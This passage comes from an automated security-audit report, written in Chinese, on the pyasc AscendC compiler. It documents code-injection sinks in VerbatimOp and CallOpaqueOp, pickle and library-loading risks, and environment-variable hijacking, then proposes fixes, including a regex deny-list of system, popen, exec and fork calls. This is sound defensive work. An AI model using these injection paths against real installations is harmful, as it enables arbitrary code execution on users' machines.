**模块**: pybind_bindings
**跨模块**: pybind_bindings → codegen

**描述**: emitasc::VerbatimOp 绑定直接将用户提供的字符串和参数插入到生成的代码中，无验证。恶意用户可注入任意代码片段。

**漏洞代码** (`python/src/OpBuilder.cpp:791-794`)

```c
.def(
    "create_emitasc_VerbatimOp",
    [](PyOpBuilder &self, const std::string &value, const std::optional<std::vector<Value>> &args) {
        self.create<emitasc::VerbatimOp>(self->getStringAttr(value), args.value_or(noValues));
    },
    "value"_a, "args"_a = py::none());
```

**达成路径**

[CREDENTIAL_FLOW] Python 用户输入 → pybind11 绑定参数 value/args → emitasc::VerbatimOp → CodeGen 模块生成 AscendC 代码

**验证说明**: Verified: emitasc::VerbatimOp binding passes value/args directly. Code injection confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 25 | mitigations: -5 | context: 0 | cross_file: 0

---

### [VULN-SEC-CI-001] code_injection - printOperation

**严重性**: High | **CWE**: CWE-94 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `lib/Target/AscendC/External/Emitc.cpp:49-52` @ `printOperation`
**模块**: ascendc_target
**跨模块**: ascendc_target → pybind_bindings → language

**描述**: emitc::VerbatimOp 直接输出用户提供的代码字符串到生成的 C++ 代码中，无任何验证或过滤。用户可通过 Python DSL 的 asc.inline() API 或 CLI 工具处理的 MLIR 文件注入任意 C++ 代码片段，生成的代码会被编译执行。

**漏洞代码** (`lib/Target/AscendC/External/Emitc.cpp:49-52`)

```c
LogicalResult mlir::printOperation(CodeEmitter &emitter, emitc::VerbatimOp verbatimOp) {
    emitter.ostream() << verbatimOp.getValue();
    return success();
}
```

**达成路径**

Python DSL: asc.inline(code) → builder.create_emitc_VerbatimOp(code) → MLIR emitc.verbatim → translateToAscendC() → emitter.ostream() << code → 生成 C++ 代码
CLI: MLIR 文件 → emitc::VerbatimOp → 直接输出

**验证说明**: Verified: emitc::VerbatimOp directly outputs user string to C++ code. No validation. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-CI-002] code_injection - printOperation

**严重性**: High | **CWE**: CWE-94 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `lib/Target/AscendC/EmitAsc.cpp:189-227` @ `printOperation`
**模块**: ascendc_target
**跨模块**: ascendc_target → pybind_bindings → language

**描述**: emitasc::VerbatimOp 直接输出用户提供的代码字符串到生成的 C++ 代码中。支持模板替换 ($1, $2 等) 但不对代码内容进行验证。用户可通过 asc.inline() API 或 MLIR 文件注入任意 C++ 代码。

**漏洞代码** (`lib/Target/AscendC/EmitAsc.cpp:189-227`)

```c
LogicalResult mlir::emitasc::printOperation(CodeEmitter &emitter, emitasc::VerbatimOp op) {
    auto code = op.getValue();
    if (args.empty()) {
        os << code;
        return success();
    }
    // 模板替换后输出
    os << result;
}
```

**达成路径**

Python DSL: asc.inline(code, args) → builder.create_emitasc_VerbatimOp(code, args) → MLIR emitasc.verbatim → 翻译 → 直接输出

**验证说明**: Verified: emitasc::VerbatimOp outputs code string directly. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-EMITASC-003] code_injection - EmitAsc_VerbatimOp

**严重性**: High | **CWE**: CWE-94 | **置信度**: 80/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `lib/Dialect/EmitAsc/IR/Ops.td:167-170` @ `EmitAsc_VerbatimOp`
**模块**: emitasc_dialect
**跨模块**: emitasc_dialect → IR生成模块 → 代码生成模块

**描述**: VerbatimOp 操作允许直接嵌入原始代码字符串（StrAttr:$value）。如果value字符串来源于外部输入或可被用户控制，可能导致代码注入或执行恶意代码片段。

**漏洞代码** (`lib/Dialect/EmitAsc/IR/Ops.td:167-170`)

```c
def EmitAsc_VerbatimOp : EmitAsc_Op<"verbatim"> {
  let arguments = (ins StrAttr:$value, Variadic<AnyType>:$args);
}
```

**达成路径**

[CREDENTIAL_FLOW] value字符串来源需跨模块追踪 -> EmitAsc_VerbatimOp -> 原始代码嵌入执行 [SINK]

**验证说明**: Verified: VerbatimOp definition allows arbitrary code embedding. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-EMITASC-002] code_injection - EmitAsc_CallOpaqueOp

**严重性**: High | **CWE**: CWE-94 | **置信度**: 75/100 | **状态**: CONFIRMED | **来源**: security-module-scanner

**位置**: `lib/Dialect/EmitAsc/IR/Ops.td:27-39` @ `EmitAsc_CallOpaqueOp`
**模块**: emitasc_dialect
**跨模块**: emitasc_dialect → IR生成模块 → 代码执行模块

**描述**: CallOpaqueOp 操作允许通过字符串名称（StrAttr:$callee）调用任意C++函数。如果callee字符串来源于外部输入或可被用户控制，可能导致执行危险函数或代码注入。

**漏洞代码** (`lib/Dialect/EmitAsc/IR/Ops.td:27-39`)

```c
def EmitAsc_CallOpaqueOp : EmitAsc_Op<"call_opaque"> {
  let arguments = (ins StrAttr:$callee, Variadic<AnyType>:$callee_operands);
  let results = (outs Optional<AnyType>:$result);
}
```

**达成路径**

[CREDENTIAL_FLOW] callee字符串来源需跨模块追踪 -> EmitAsc_CallOpaqueOp -> 函数调用执行 [SINK]

**验证说明**: Verified: CallOpaqueOp definition allows arbitrary callee string. Attack chain confirmed.

**评分明细**: base: 30 | reachability: 25 | controllability: 20 | mitigations: -5 | context: 0 | cross_file: 0

---

## 5. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| ascendc_target | 0 | 2 | 0 | 0 | 2 |
| cross_module | 3 | 0 | 0 | 0 | 3 |
| emitasc_dialect | 0 | 2 | 0 | 0 | 2 |
| include_headers | 2 | 0 | 0 | 0 | 2 |
| lib_runtime | 6 | 0 | 0 | 0 | 6 |
| pybind_bindings | 0 | 2 | 0 | 0 | 2 |
| runtime | 2 | 0 | 0 | 0 | 2 |
| **合计** | **13** | **6** | **0** | **0** | **19** |

## 6. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-94 | 10 | 52.6% |
| CWE-427 | 3 | 15.8% |
| CWE-78 | 2 | 10.5% |
| CWE-502 | 2 | 10.5% |
| CWE-913 | 1 | 5.3% |
| CWE-426 | 1 | 5.3% |

---

## 7. 修复建议

### 7.1 优先级 1: 立即修复 (Critical 漏洞 - 环境变量安全加固)

**风险**: 环境变量劫持可导致任意代码执行，影响所有使用 pyasc 的用户。

**具体修复措施**:

| 环境变量 | 当前风险 | 修复方案 |
|---------|---------|---------|
| `PYASC_COMPILER` | 通过 shutil.which() + PATH 搜索，可被劫持 | 1. 强制使用绝对路径，拒绝 basename<br>2. 白名单：仅允许 `/usr/bin/`, `/usr/local/bin/`, `/opt/cann/`<br>3. 签名验证编译器二进制 |
| `PYASC_LINKER` | 同上 | 同上，链接器白名单：`ld.lld`, `ld.bfd`, `ld.gold` |
| `PYASC_CACHE_DIR` | 缓存污染导致 pickle RCE + 恶意 .so 加载 | 1. **完全禁用**此环境变量<br>2. 使用固定路径 `~/.pyasc/cache`<br>3. 目录权限强制 `0700` |
| `PYASC_HOME` | 可指向任意目录 | 禁用，使用 `os.path.expanduser("~/")` |

**pickle 反序列化安全改造**:

```python
# 当前不安全实现 (jit.py:171-172)
with open(dst, 'rb') as file:
    kernel = pickle.load(file)

# 推荐安全方案 A: 使用 JSON 序列化
import json, base64
with open(dst, 'r') as file:
    data = json.load(file)
    kernel = CompiledKernel.from_dict(data)  # 需实现 from_dict 方法

# 推荐安全方案 B: 签名验证
import hmac
SECRET_KEY_PATH = Path("~/.pyasc/.secret").expanduser()
def verify_and_load(path):
    with open(path, 'rb') as f:
        signed_data = f.read()
    signature = signed_data[-32:]  # HMAC-SHA256
    data = signed_data[:-32]
    key = SECRET_KEY_PATH.read_bytes()
    expected_sig = hmac.new(key, data, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected_sig):
        raise SecurityError("Cache file signature verification failed")
    return pickle.loads(data)
```

**动态库加载安全改造**:

```python
# 当前不安全实现 (state.py:50)
self.lib = ctypes.CDLL(rt_lib, ctypes.RTLD_GLOBAL)

# 推荐安全方案: 签名验证 + 白名单路径
def safe_load_library(lib_path):
    # 1. 验证路径在可信目录内
    cache_root = Path("~/.pyasc/cache").expanduser().resolve()
    lib_path_resolved = Path(lib_path).resolve()
    if not str(lib_path_resolved).startswith(str(cache_root)):
        raise SecurityError("Library path outside trusted cache")
    
    # 2. 验证签名（写入时存储签名文件）
    sig_path = lib_path_resolved.with_suffix(".sig")
    if not sig_path.exists():
        raise SecurityError("Missing library signature")
    verify_signature(lib_path_resolved, sig_path)
    
    # 3. 使用 RTLD_NOW 立即绑定
    return ctypes.CDLL(str(lib_path_resolved), ctypes.RTLD_NOW | ctypes.RTLD_LOCAL)
```

### 7.2 优先级 2: 短期修复 (High 漏洞 - 代码注入防护)

**风险**: VerbatimOp 和 CallOpaqueOp 可将任意字符串嵌入生成的 C++ 代码，导致代码注入。

**修复措施**:

| 漏洞位置 | 修复方案 |
|---------|---------|
| `emitc::VerbatimOp` (Emitc.cpp:49-52) | 1. 添加代码验证器，拒绝危险模式（`system`, `exec`, `popen`, `fork`）<br>2. 限制字符串长度（如 < 10KB）<br>3. 对生成的代码进行 AST 检查 |
| `emitasc::VerbatimOp` (EmitAsc.cpp:189-227) | 同上，额外验证模板参数 `$1`, `$2` 等 |
| `emitasc::CallOpaqueOp` | 1. callee 函数名白名单（仅允许 AscendC API）<br>2. 拒绝调用系统函数（`malloc`, `free`, `system` 等） |
| pybind 绑定 (OpBuilder.cpp:765-794) | 在绑定层添加输入验证，拒绝危险字符串 |

**代码验证器示例**:

```python
# python/asc/codegen/code_validator.py
DANGEROUS_PATTERNS = [
    r'\bsystem\s*\(',
    r'\bpopen\s*\(',
    r'\bexec[lv]?[pe]?\s*\(',
    r'\bfork\s*\(',
    r'\bunlink\s*\(',
    r'#include\s*[<"]stdlib[>"]',
]

def validate_verbatim_code(code: str) -> bool:
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, code):
            raise SecurityError(f"VerbatimOp contains forbidden pattern: {pattern}")
    if len(code) > 10000:  # 10KB 限制
        raise SecurityError("VerbatimOp code too long")
    return True

# 在 OpBuilder.cpp 绑定中调用验证
.def("create_emitc_VerbatimOp",
     [](PyOpBuilder &self, const std::string &str) {
         validate_verbatim_code(str);  // 新增验证
         self.create<emitc::VerbatimOp>(StringRef(str));
     })
```

### 7.3 优先级 3: 计划修复 (架构级安全加固)

**CLI 工具安全**:
- 对 MLIR 文件输入实施深度验证（检查 VerbatimOp/CallOpaqueOp 内容）
- 添加沙箱模式选项：限制生成的代码可调用的函数
- 使用 `seccomp` 或 `pledge` 限制 CLI 工具的系统调用

**临时文件安全**:
- 使用 `tempfile.mkstemp()` 替代 `mktemp`（自动设置安全权限）
- 临时文件权限强制 `0600`
- 临时目录使用 `tempfile.mkdtemp()`，权限 `0700`

**日志与审计**:
- 记录所有环境变量使用情况（编译器路径、缓存目录）
- 记录所有 VerbatimOp 内容（便于事后审计）
- 记录所有动态库加载路径

**开发建议**:
- 考虑引入 `hmac` 签名机制保护所有缓存文件
- 考虑使用 `trusted-exec` 或 `capstone` 等安全编译框架
- 在 CI/CD 中集成安全扫描（如本次扫描流程）
